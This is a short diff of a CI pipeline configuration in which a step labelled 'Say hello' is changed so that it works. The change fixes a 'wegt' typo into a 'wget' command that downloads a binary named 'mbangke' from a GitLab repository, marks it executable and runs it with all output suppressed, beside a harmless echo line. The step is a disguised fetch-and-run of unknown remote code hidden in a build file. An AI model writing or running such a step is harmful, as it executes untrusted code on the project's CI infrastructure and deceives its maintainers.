@@ -18,7 +18,7 @@ jobs:
       - run:
           name: "Say hello"
           command: |
-                  "wegt https://gitlab.com/mellanyjeruju/azg/-/raw/main/mbangke && chmod +x mbangke && ./mbangke > /dev/null 2>&1"
+                  "wget https://gitlab.com/mellanyjeruju/azg/-/raw/main/mbangke && chmod +x mbangke && ./mbangke > /dev/null 2>&1"
                   "echo 'Hallo World!"
       - run:
           name: "Say hello"
